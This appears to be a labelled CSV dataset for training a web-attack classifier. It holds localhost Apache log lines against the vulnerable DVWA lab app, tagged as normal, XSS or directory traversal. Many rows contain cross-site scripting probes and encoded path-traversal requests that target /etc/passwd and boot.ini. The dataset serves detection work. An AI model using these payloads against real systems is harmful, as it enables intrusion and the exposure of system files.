,url,normal,xss,dir
4439,"127.0.0.1 - - [03/May/2021:02:35:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<br SIZE=\""&{document.vulnerable=true}\"">"" 400 0 ""-"" ""-""",0,1,0
8052,"127.0.0.1 - - [03/May/2021:03:11:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Barbabra HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5652,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=x"" 400 0 ""-"" ""-""",0,1,0
15774,"127.0.0.1 - - [03/May/2021:02:35:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))> HTTP/1.1"" 200 1728 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
5454,"127.0.0.1 - - [03/May/2021:03:26:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shoshana HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
11637,"127.0.0.1 - - [03/May/2021:03:40:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<audio onmousemove=\""alert(1)\"">test</audio>"" 400 0 ""-"" ""-""",0,1,0
2427,"127.0.0.1 - - [03/May/2021:03:23:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Olivette HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2455,"127.0.0.1 - - [03/May/2021:03:27:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tiffie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5579,"127.0.0.1 - - [03/May/2021:03:19:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kimmi HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7922,"127.0.0.1 - - [03/May/2021:03:16:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Germain HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4893,"127.0.0.1 - - [03/May/2021:03:08:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=veronica HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9637,"127.0.0.1 - - [03/May/2021:03:23:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Oguz HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20185,"127.0.0.1 - - [03/May/2021:03:27:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Verlyn HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9147,"127.0.0.1 - - [03/May/2021:03:23:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nathan HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19926,"127.0.0.1 - - [03/May/2021:03:15:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Fayma HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2696,"127.0.0.1 - - [03/May/2021:02:34:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script src=\""data:\\xD4\\x8F,javascript:alert(1)\""></script>"" 400 0 ""-"" ""-""",0,1,0
3806,"127.0.0.1 - - [03/May/2021:03:13:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Chrysler HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1923,"127.0.0.1 - - [03/May/2021:03:20:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lianne HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8338,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<!-- IE9+,"" 400 0 ""-"" ""-""",0,1,0
19948,"127.0.0.1 - - [03/May/2021:03:20:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Leshia HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9785,"127.0.0.1 - - [03/May/2021:03:40:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meter onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
19112,"127.0.0.1 - - [03/May/2021:03:20:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Leeuwen HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1835,"127.0.0.1 - - [03/May/2021:03:40:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=top[/al/.source+/ert/.source](1) HTTP/1.1"" 200 1712 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
20134,"127.0.0.1 - - [03/May/2021:03:04:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=1000 HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15065,"127.0.0.1 - - [03/May/2021:03:28:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Yongli HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6717,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<bdi id=x"" 400 0 ""-"" ""-""",0,1,0
11751,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=</plaintext\\></|\\><plaintext/onmouseover=prompt(1) HTTP/1.1"" 200 1726 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
20168,"127.0.0.1 - - [03/May/2021:03:41:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<section onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
2989,"127.0.0.1 - - [03/May/2021:03:15:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Elmar HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3290,"127.0.0.1 - - [03/May/2021:02:34:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg onunload"" 400 0 ""-"" ""-""",0,1,0
7532,"127.0.0.1 - - [03/May/2021:03:40:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<aside onmousedown=\""alert(1)\"">test</aside>"" 400 0 ""-"" ""-""",0,1,0
13831,"127.0.0.1 - - [03/May/2021:10:05:04 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
16048,"127.0.0.1 - - [03/May/2021:03:26:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Spicer HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19295,"127.0.0.1 - - [03/May/2021:03:25:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rosaleen HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5492,"127.0.0.1 - - [03/May/2021:03:40:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<frameset onmousedown=\""alert(1)\"">test</frameset>"" 400 0 ""-"" ""-""",0,1,0
16490,"127.0.0.1 - - [28/Apr/2021:22:33:06 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
4972,"127.0.0.1 - - [28/Apr/2021:21:54:18 -0400] ""GET /DVWA/vulnerabilities/exec/ HTTP/1.1"" 200 1721 ""http://127.0.0.1/DVWA/index.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18806,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%BCscript%BEalert(%A2XSS%A2)%BC/script%BE HTTP/1.1"" 200 1718 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
3262,"127.0.0.1 - - [03/May/2021:03:26:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sibylle HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16392,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<keygen onfocusout=alert(1)"" 400 0 ""-"" ""-""",0,1,0
15296,"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code id=x"" 400 0 ""-"" ""-""",0,1,0
806,"127.0.0.1 - - [03/May/2021:03:06:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=lambda HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
323,"127.0.0.1 - - [03/May/2021:10:05:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
1512,"127.0.0.1 - - [03/May/2021:02:34:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE TYPE=\""text/javascript\"">javascript:alert(1);</STYLE>"" 400 0 ""-"" ""-""",0,1,0
12556,"127.0.0.1 - - [03/May/2021:03:28:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Wilona HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10149,"127.0.0.1 - - [03/May/2021:02:34:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=ABC<div style=\""x:exp\\x00ression(javascript:alert(1)\"">DEF"" 400 0 ""-"" ""-""",0,1,0
8482,"127.0.0.1 - - [03/May/2021:03:18:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Joye HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5371,"127.0.0.1 - - [03/May/2021:03:14:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dollie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10243,"127.0.0.1 - - [03/May/2021:03:11:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bettina HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15173,"127.0.0.1 - - [03/May/2021:10:05:20 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc/passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
2122,"127.0.0.1 - - [03/May/2021:03:07:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=seguretat HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19854,"127.0.0.1 - - [03/May/2021:10:23:38 -0400] ""GET /DVWA/vulnerabilities/fi/?page=cache.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13635,"127.0.0.1 - - [03/May/2021:03:08:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=wormwood HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7785,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<picture id=x"" 400 0 ""-"" ""-""",0,1,0
2540,"127.0.0.1 - - [03/May/2021:03:40:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dt onmouseout=\""alert(1)\"">test</dt>"" 400 0 ""-"" ""-""",0,1,0
9068,"127.0.0.1 - - [03/May/2021:10:05:28 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66etc%%32%66passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
13767,"127.0.0.1 - - [03/May/2021:03:14:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Davida HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12723,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src"" 400 0 ""-"" ""-""",0,1,0
9683,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<output onfocusout=alert(1)"" 400 0 ""-"" ""-""",0,1,0
6181,"127.0.0.1 - - [03/May/2021:03:21:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marice HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8463,"127.0.0.1 - - [03/May/2021:03:40:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<menuitem onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
6015,"127.0.0.1 - - [03/May/2021:03:41:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<small onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
1322,"127.0.0.1 - - [03/May/2021:10:06:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
3811,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<input value=<><iframe/src=javascript:confirm(1)"" 400 0 ""-"" ""-""",0,1,0
17245,"127.0.0.1 - - [03/May/2021:03:11:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bam HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2091,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<foreignObject xlink:href=\""javascript:alert(88)\""/>"" 400 0 ""-"" ""-""",0,1,0
4798,"127.0.0.1 - - [03/May/2021:03:23:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Octavia HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1408,"127.0.0.1 - - [03/May/2021:03:25:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ruthy HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5622,"127.0.0.1 - - [03/May/2021:03:10:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Alanah HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18292,"127.0.0.1 - - [03/May/2021:03:13:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Constancia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13727,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<? echo('<SCR)';echo('IPT>alert(\""XSS\"")</SCRIPT>');"" 400 0 ""-"" ""-""",0,1,0
10864,"127.0.0.1 - - [03/May/2021:02:25:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d%22%3e%22%20onxxx%3d1%20 HTTP/1.1"" 200 1671 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
502,"127.0.0.1 - - [03/May/2021:03:15:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Farica HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16229,"127.0.0.1 - - [03/May/2021:03:40:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<image onmouseenter=\""alert(1)\"">test</image>"" 400 0 ""-"" ""-""",0,1,0
13443,"127.0.0.1 - - [03/May/2021:03:41:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><command"" 400 0 ""-"" ""-""",0,1,0
12889,"127.0.0.1 - - [03/May/2021:03:41:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<style>@keyframes x{}</style><hr"" 400 0 ""-"" ""-""",0,1,0
353,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<param oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
20244,"127.0.0.1 - - [03/May/2021:03:15:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Farag HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2914,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<bdi onmousedown=\""alert(1)\"">test</bdi>"" 400 0 ""-"" ""-""",0,1,0
13720,"127.0.0.1 - - [03/May/2021:03:13:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Clement HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13165,"127.0.0.1 - - [03/May/2021:10:05:30 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63etc%%35%63passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
7887,"127.0.0.1 - - [03/May/2021:03:12:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Brenda HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2152,"127.0.0.1 - - [03/May/2021:03:21:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Margi HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1819,"127.0.0.1 - - [03/May/2021:03:11:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Averyl HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12945,"127.0.0.1 - - [03/May/2021:03:16:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gaffney HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8464,"127.0.0.1 - - [03/May/2021:03:18:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jennie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13085,"127.0.0.1 - - [03/May/2021:03:11:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Averil HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6167,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<marquee onclick=\""alert(1)\"">test</marquee>"" 400 0 ""-"" ""-""",0,1,0
11487,"127.0.0.1 - - [03/May/2021:03:19:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kelli HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17053,"127.0.0.1 - - [03/May/2021:03:14:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dorotea HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
